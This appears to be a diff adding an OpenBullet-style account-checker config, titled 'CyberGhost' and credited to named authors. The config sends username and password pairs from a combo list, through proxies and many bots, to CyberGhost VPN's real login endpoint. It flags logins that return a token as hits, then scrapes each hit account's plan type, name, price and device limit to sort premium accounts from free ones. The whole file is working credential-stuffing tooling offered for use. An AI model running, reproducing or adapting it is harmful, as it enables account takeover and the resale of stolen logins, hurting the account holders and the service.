@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "CyberGhost",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-22T14:05:19.0029214+02:00",
+  "AdditionalInfo": "from Fakeboy, entirely fixed",
+  "Author": "sp6off",
+  "Version": "1.3.4 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://my.cyberghostvpn.com/api/login" AutoRedirect=FALSE 
+  CONTENT "_method=POST&username=<USER>&password=<PASS>&locale=en_US" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: my.cyberghostvpn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://my.cyberghostvpn.com/en_US/login" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 416" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"jwt\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"Invalid credentials\"" 
+
+REQUEST GET "https://my.cyberghostvpn.com/en_US/account" 
+  
+  HEADER "Host: my.cyberghostvpn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://my.cyberghostvpn.com/en_US/login" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive: 1" 
+  HEADER "TE: Trailers" 
+
+#SUB PARSE "<SOURCE>" LR "\"planType\":" "," -> CAP "Sub" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Sub>" Contains "\"premium\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Sub>" Contains "\"free\"" 
+
+#PLAN PARSE "<SOURCE>" LR "\"displayName\": \"" "," -> CAP "Plan" 
+
+#PRICE PARSE "<SOURCE>" LR "\"USD\": " "," -> CAP "Price" 
+
+#MAX_DEVICES PARSE "<SOURCE>" LR "\"maxDevices\":" "," -> CAP "Maxdevices" 
+
